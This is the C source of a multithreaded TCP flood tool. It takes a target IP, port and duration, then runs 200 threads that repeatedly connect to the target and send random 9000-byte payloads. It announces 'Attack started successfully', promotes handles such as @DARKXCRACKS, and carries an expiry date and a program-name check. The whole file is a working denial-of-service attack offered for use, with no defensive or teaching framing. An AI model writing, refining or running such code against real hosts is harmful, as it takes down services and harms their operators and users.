#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <pthread.h>
#include <errno.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/resource.h>
#include <zlib.h>
#include <libgen.h>

#define BUFFER_SIZE 9000
#define EXPIRATION_YEAR 2026
#define EXPIRATION_MONTH 1
#define EXPIRATION_DAY 20
#define DEFAULT_THREADS 200
#define EXPECTED_PROGRAM_NAME "megoxer"

// Function to generate a random string payload
void generate_payload(char *buffer, size_t length) {
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (size_t i = 0; i < length - 1; i++) {
        buffer[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    buffer[length - 1] = '\0';
}

// Function to calculate CRC32
unsigned long calculate_crc32(const char *data) {
    unsigned long crc = crc32(0L, Z_NULL, 0);
    crc = crc32(crc, (const unsigned char *)data, strlen(data));
    return crc;
}

// Function to check if the program is expired
int is_expired() {
    time_t now = time(NULL);
    struct tm *current_time = localtime(&now);
    if (current_time->tm_year + 1900 > EXPIRATION_YEAR ||
        (current_time->tm_year + 1900 == EXPIRATION_YEAR &&
         (current_time->tm_mon + 1 > EXPIRATION_MONTH ||
          (current_time->tm_mon + 1 == EXPIRATION_MONTH && current_time->tm_mday > EXPIRATION_DAY)))) {
        return 1;
    }
    return 0;
}

// Thread function for sending payloads
void *send_payload(void *arg) {
    char *ip = ((char **)arg)[0];
    int port = atoi(((char **)arg)[1]);
    int duration = atoi(((char **)arg)[2]);

    int sock;
    struct sockaddr_in server_addr;
    char payload[BUFFER_SIZE];

    generate_payload(payload, BUFFER_SIZE);

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &server_addr.sin_addr);

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < duration) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            perror("Socket creation failed");
            continue;
        }

        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Connection failed");
            close(sock);
            continue;
        }

        if (send(sock, payload, strlen(payload), 0) < 0) {
            perror("Send failed");
        }

        close(sock);
    }

    return NULL;
}

// Main function
int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: ./GOD <IP> <PORT> <TIME> BY @GODNEXTYT2\n");
        return 1;
    }

    // Check if the program is expired
    if (is_expired()) {
        printf("This program has expired.\n");
        return 1;
    }

    // Validate program name
    if (strcmp(basename(argv[0]), EXPECTED_PROGRAM_NAME) != 0) {
        printf("Error: The program must be run as \"%s\".\n", EXPECTED_PROGRAM_NAME);
        return 1;
    }

    // Parse arguments
    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    // Calculate CRC32 for "DEVIL"
    unsigned long crc = calculate_crc32("DEVIL");

    printf("Attack started successfully\n");
    printf("IP: %s\n", ip);
    printf("Port: %d\n", port);
    printf("Time: %d seconds\n", duration);
    printf("Threads: %d\n", DEFAULT_THREADS);
    printf("JOIN @DARKXCRACKS\n");
    printf("CRC32 (hidden) for 'DEVIL': 0x%08lx\n", crc);

    pthread_t threads[DEFAULT_THREADS];
    char *thread_args[3] = {ip, argv[2], argv[3]};

    for (int i = 0; i < DEFAULT_THREADS; i++) {
        if (pthread_create(&threads[i], NULL, send_payload, thread_args) != 0) {
            perror("Thread creation failed");
        }
    }

    for (int i = 0; i < DEFAULT_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\n=====================================================\n");
    printf(">>>>> ATTACK EXECUTION COMPLETE <<<<<\n");
    printf("Target Information:\n");
    printf("    - IP: %s\n", ip);
    printf("    - Port: %d\n", port);
    printf("    - Duration: %d seconds\n", duration);
    printf("    - Threads Used: %d\n", DEFAULT_THREADS);
    printf("CRC32 for 'DEVIL': 0x%08lx\n", crc);
    printf("Thank you for using this tool. JOIN @DARKXCRACKS\n");
    printf("=====================================================\n");

    return 0;
}